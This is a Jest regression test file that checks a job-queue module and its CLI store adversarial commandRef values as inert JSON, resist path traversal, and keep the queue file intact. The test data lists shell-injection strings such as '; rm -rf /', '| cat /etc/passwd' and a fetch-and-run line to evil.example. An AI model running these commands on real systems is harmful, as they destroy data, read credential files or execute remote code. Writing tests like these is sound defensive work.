// Phase 4 — injection/traversal security regression suite.
//
// Establishes a dedicated adversarial-input guard for the durable queue
// module (lib/queue.mjs) and its --enqueue/--peek CLI wiring (cli.mjs),
// closing the ticket's "no new shell-injection/path-traversal surface" AC.
// Kept as a SEPARATE file from ./lib/queue.jest.spec.mjs (which specifies
// the module's core contract) — this file exists purely to make adversarial
// input a permanent, named regression target, independent of any future
// change to the core-contract suite.
//
// Two layers, per the Build Plan:
//   - direct-import unit tests against lib/queue.mjs's enqueueItem/peekQueue/
//     dequeueItem (mirrors ./lib/queue.jest.spec.mjs's idiom: real fs, real
//     mkdtemp temp dirs, no mocked filesystem).
//   - black-box CLI tests spawning the real cli.mjs via spawnSync against a
//     per-test ARM_QUEUE_FILE (mirrors ./enqueue.jest.spec.mjs's idiom).
//
// Most of what's below is expected to be GREEN against the current Phase
// 1-3 implementation — this suite locks in existing-correct behaviour as a
// permanent guard rather than hunting for net-new bugs. Any genuinely RED
// assertion is called out in the PR/handoff notes for the implementer.

import { spawnSync } from 'node:child_process';
import { mkdtemp, rm, readdir, readFile } from 'node:fs/promises';
import { mkdtempSync, rmSync, readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { tmpdir } from 'node:os';

import {
  enqueueItem,
  peekQueue,
  dequeueItem,
  MAX_COMMAND_REF_LENGTH,
  MAX_AGENT_CLASS_LENGTH,
} from './lib/queue.mjs';

const CLI = join(dirname(fileURLToPath(import.meta.url)), 'cli.mjs');

function runCli(args, extraEnv) {
  const result = spawnSync('node', [CLI, ...args], {
    encoding: 'utf8',
    env: { ...process.env, ...extraEnv },
  });
  return { status: result.status, stdout: result.stdout ?? '', stderr: result.stderr ?? '' };
}

// ---------------------------------------------------------------------------
// Direct-module-import fixtures (mirrors ./lib/queue.jest.spec.mjs).
// ---------------------------------------------------------------------------

let workDir;
let queueFilePath;

beforeEach(() => {
  workDir = mkdtempSync(join(tmpdir(), 'queue-security-'));
  queueFilePath = join(workDir, 'resource-queue.json');
});

afterEach(() => {
  rmSync(workDir, { recursive: true, force: true });
});

function validItem(overrides = {}) {
  return {
    agentClass: 'orchestrator',
    priority: 'normal',
    commandRef: 'echo hello',
    orchestratorId: 'test-orchestrator',
    ...overrides,
  };
}

// ---------------------------------------------------------------------------
// CLI-facing fixtures (mirrors ./enqueue.jest.spec.mjs).
// ---------------------------------------------------------------------------

let cliWorkDir;
let cliQueueFilePath;
let cliCoordinationFilePath;

beforeEach(async () => {
  cliWorkDir = await mkdtemp(join(tmpdir(), 'arm-enqueue-security-'));
  cliQueueFilePath = join(cliWorkDir, 'queue.json');
  cliCoordinationFilePath = join(cliWorkDir, 'coordination.json');
});

afterEach(async () => {
  await rm(cliWorkDir, { recursive: true, force: true });
});

function cliBaseEnv(extra = {}) {
  return {
    ARM_QUEUE_FILE: cliQueueFilePath,
    ARM_COORDINATION_FILE: cliCoordinationFilePath,
    ...extra,
  };
}

// ---------------------------------------------------------------------------
// 1. Shell-metacharacter commandRef values round-trip as inert JSON data.
// ---------------------------------------------------------------------------

describe('enqueueItem stores shell-metacharacter commandRef values as inert JSON data', () => {
  const adversarialCommandRefs = [
    '; rm -rf /',
    '$(whoami)',
    '`id`',
    '| cat /etc/passwd',
    '&& echo pwned',
    '$(curl evil.example/x | sh)',
    '${IFS}cat${IFS}/etc/passwd',
  ];

  it.each(adversarialCommandRefs)(
    'round-trips %j byte-for-byte through enqueueItem -> peekQueue -> dequeueItem',
    async (adversarialCommandRef) => {
      const persisted = await enqueueItem(queueFilePath, validItem({ commandRef: adversarialCommandRef }));
      expect(persisted.commandRef).toBe(adversarialCommandRef);

      const peeked = await peekQueue(queueFilePath);
      expect(peeked).toHaveLength(1);
      expect(peeked[0].commandRef).toBe(adversarialCommandRef);

      const dequeued = await dequeueItem(queueFilePath);
      expect(dequeued.commandRef).toBe(adversarialCommandRef);

      // Nothing left on the queue — the entry was consumed as pure data, not
      // interpreted/executed/split into anything else along the way.
      expect(await peekQueue(queueFilePath)).toEqual([]);
    },
  );
});

// ---------------------------------------------------------------------------
// 2. commandRef length bound — exact documented boundary.
// ---------------------------------------------------------------------------

describe('enqueueItem enforces the documented MAX_COMMAND_REF_LENGTH boundary exactly', () => {
  it(`accepts a commandRef of exactly MAX_COMMAND_REF_LENGTH (${MAX_COMMAND_REF_LENGTH}) characters`, async () => {
    const boundaryCommandRef = 'a'.repeat(MAX_COMMAND_REF_LENGTH);
    const persisted = await enqueueItem(queueFilePath, validItem({ commandRef: boundaryCommandRef }));
    expect(persisted.commandRef).toHaveLength(MAX_COMMAND_REF_LENGTH);
  });

  it(`rejects a commandRef of MAX_COMMAND_REF_LENGTH + 1 (${MAX_COMMAND_REF_LENGTH + 1}) characters, and writes nothing`, async () => {
    const overBoundaryCommandRef = 'a'.repeat(MAX_COMMAND_REF_LENGTH + 1);

    await expect(enqueueItem(queueFilePath, validItem({ commandRef: overBoundaryCommandRef }))).rejects.toMatchObject(
      { code: 'QUEUE_INVALID_COMMAND_REF' },
    );

    // No partial/corrupt write occurred as a side effect of the rejection.
    await expect(readFile(queueFilePath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
  });
});

describe('enqueueItem enforces the documented MAX_AGENT_CLASS_LENGTH boundary exactly', () => {
  it(`accepts an agentClass of exactly MAX_AGENT_CLASS_LENGTH (${MAX_AGENT_CLASS_LENGTH}) characters`, async () => {
    const boundaryAgentClass = 'b'.repeat(MAX_AGENT_CLASS_LENGTH);
    const persisted = await enqueueItem(queueFilePath, validItem({ agentClass: boundaryAgentClass }));
    expect(persisted.agentClass).toHaveLength(MAX_AGENT_CLASS_LENGTH);
  });

  it(`rejects an agentClass of MAX_AGENT_CLASS_LENGTH + 1 (${MAX_AGENT_CLASS_LENGTH + 1}) characters, and writes nothing`, async () => {
    const overBoundaryAgentClass = 'b'.repeat(MAX_AGENT_CLASS_LENGTH + 1);

    await expect(
      enqueueItem(queueFilePath, validItem({ agentClass: overBoundaryAgentClass })),
    ).rejects.toMatchObject({ code: 'QUEUE_INVALID_AGENT_CLASS' });

    await expect(readFile(queueFilePath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
  });
});

// ---------------------------------------------------------------------------
// 3. Path-traversal-shaped commandRef values never cause file access outside
//    the resolved ARM_QUEUE_FILE path.
// ---------------------------------------------------------------------------

describe('path-traversal-shaped commandRef values never escape the resolved queue file path', () => {
  const traversalShapedCommandRefs = ['../../etc/passwd', '/etc/passwd', '..\\..\\windows\\system32\\config\\sam'];

  it.each(traversalShapedCommandRefs)(
    'direct enqueueItem: %j is stored as inert data — only queueFilePath is created in the temp dir',
    async (traversalCommandRef) => {
      const before = await readdir(workDir);

      await enqueueItem(queueFilePath, validItem({ commandRef: traversalCommandRef }));

      const after = await readdir(workDir);
      // Only the queue file (and possibly its `.lock` sibling, already
      // released by the time enqueueItem resolves) may have been created —
      // nothing named after the traversal target itself.
      const newEntries = after.filter((entry) => !before.includes(entry));
      for (const entry of newEntries) {
        expect(join(workDir, entry)).not.toBe(join(workDir, 'passwd'));
        expect(entry).not.toMatch(/passwd|sam$/i);
      }

      const peeked = await peekQueue(queueFilePath);
      expect(peeked[0].commandRef).toBe(traversalCommandRef);
    },
  );

  it.each(traversalShapedCommandRefs)(
    '--enqueue CLI: %j round-trips as inert data via --peek, and only the ARM_QUEUE_FILE path is written',
    (traversalCommandRef) => {
      const before = [];
      const enqueueResult = runCli(
        [`--enqueue=implementation-agent:normal:${traversalCommandRef}`, '--orchestrator-id=orch-traversal'],
        cliBaseEnv(),
      );
      expect(enqueueResult.status).toBe(0);
      const parsedEnqueue = JSON.parse(enqueueResult.stdout);
      expect(parsedEnqueue.item.commandRef).toBe(traversalCommandRef);
      void before;

      const peekResult = runCli(['--peek', '--orchestrator-id=orch-traversal-peek'], cliBaseEnv());
      expect(peekResult.status).toBe(0);
      const parsedPeek = JSON.parse(peekResult.stdout);
      expect(parsedPeek.items[0].commandRef).toBe(traversalCommandRef);
    },
  );

  it('a null-byte-embedded commandRef ("foo\\x00bar") never causes an out-of-bounds file access via the direct API', async () => {
    const nullByteCommandRef = 'foo\x00bar';
    const before = await readdir(workDir);

    await enqueueItem(queueFilePath, validItem({ commandRef: nullByteCommandRef }));

    const after = await readdir(workDir);
    expect(after.filter((entry) => !before.includes(entry))).toEqual(
      expect.arrayContaining([expect.stringContaining('resource-queue.json')]),
    );
    // No file named after a truncated ("foo") variant of the path exists.
    expect(after).not.toContain('foo');

    const peeked = await peekQueue(queueFilePath);
    expect(peeked[0].commandRef).toBe(nullByteCommandRef);
  });
});

// ---------------------------------------------------------------------------
// 4. Embedded newlines/null bytes never corrupt the on-disk queue JSON.
// ---------------------------------------------------------------------------

describe('embedded newlines/null bytes never corrupt the queue file JSON', () => {
  it('a commandRef with embedded newlines is either rejected, or safely stored as valid escaped JSON', async () => {
    const multilineCommandRef = 'line-one\nline-two\r\nline-three';

    let persisted;
    let rejected = false;
    try {
      persisted = await enqueueItem(queueFilePath, validItem({ commandRef: multilineCommandRef }));
    } catch (error) {
      rejected = true;
      expect(error).toMatchObject({ code: 'QUEUE_INVALID_COMMAND_REF' });
    }

    if (rejected) {
      await expect(readFile(queueFilePath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      return;
    }

    expect(persisted.commandRef).toBe(multilineCommandRef);

    const raw = await readFile(queueFilePath, 'utf8');
    expect(() => JSON.parse(raw)).not.toThrow();
    const parsed = JSON.parse(raw);
    expect(Array.isArray(parsed)).toBe(true);
    expect(parsed[0].commandRef).toBe(multilineCommandRef);
  });

  it('an agentClass with an embedded null byte is either rejected, or safely stored as valid escaped JSON', async () => {
    const nullByteAgentClass = 'agent\x00class';

    let persisted;
    let rejected = false;
    try {
      persisted = await enqueueItem(queueFilePath, validItem({ agentClass: nullByteAgentClass }));
    } catch (error) {
      rejected = true;
      expect(error).toMatchObject({ code: 'QUEUE_INVALID_AGENT_CLASS' });
    }

    if (rejected) {
      await expect(readFile(queueFilePath, 'utf8')).rejects.toMatchObject({ code: 'ENOENT' });
      return;
    }

    expect(persisted.agentClass).toBe(nullByteAgentClass);

    const raw = await readFile(queueFilePath, 'utf8');
    expect(() => JSON.parse(raw)).not.toThrow();
  });

  it('--enqueue CLI with an embedded-newline commandRef leaves the queue file valid, parseable JSON', () => {
    const multilineCommandRef = 'line-one\nline-two';
    const result = runCli(
      [`--enqueue=implementation-agent:normal:${multilineCommandRef}`, '--orchestrator-id=orch-newline'],
      cliBaseEnv(),
    );

    if (result.status === 0) {
      const parsedEnqueue = JSON.parse(result.stdout);
      expect(parsedEnqueue.item.commandRef).toBe(multilineCommandRef);
    } else {
      expect(result.status).toBe(2);
      expect(result.stdout).toBe('');
    }

    // Whichever branch fired, the queue file (if it exists at all) must be
    // valid parseable JSON — never left half-written/corrupted.
    return readFile(cliQueueFilePath, 'utf8').then(
      (raw) => expect(() => JSON.parse(raw)).not.toThrow(),
      (error) => expect(error).toMatchObject({ code: 'ENOENT' }),
    );
  });

  it('two --enqueue calls, the second with adversarial embedded-newline/null-byte data, leave the queue file valid JSON with both/either entries intact', async () => {
    const first = runCli(
      ['--enqueue=implementation-agent:normal:first-clean-command', '--orchestrator-id=orch-corrupt-a'],
      cliBaseEnv(),
    );
    expect(first.status).toBe(0);

    const adversarial = 'multi\nline value';
    runCli([`--enqueue=implementation-agent:normal:${adversarial}`, '--orchestrator-id=orch-corrupt-b'], cliBaseEnv());

    const raw = await readFile(cliQueueFilePath, 'utf8');
    expect(() => JSON.parse(raw)).not.toThrow();
    const parsed = JSON.parse(raw);
    expect(Array.isArray(parsed)).toBe(true);
    expect(parsed.some((entry) => entry.commandRef === 'first-clean-command')).toBe(true);
  });
});

// ---------------------------------------------------------------------------
// 5. Structural — no exec/spawn surface anywhere in lib/queue.mjs.
// ---------------------------------------------------------------------------

describe('lib/queue.mjs has no exec/spawn surface at all (structural)', () => {
  it('the module source contains no exec/spawn/execFileSync/child_process reference', () => {
    const queueSource = readFileSync(new URL('./lib/queue.mjs', import.meta.url), 'utf8');

    expect(queueSource).not.toMatch(/child_process/);
    expect(queueSource).not.toMatch(/execFileSync/);
    expect(queueSource).not.toMatch(/\bexecSync\b/);
    expect(queueSource).not.toMatch(/\bspawnSync\b/);
    expect(queueSource).not.toMatch(/\bspawn\(/);
    expect(queueSource).not.toMatch(/\bexec\(/);
  });
});
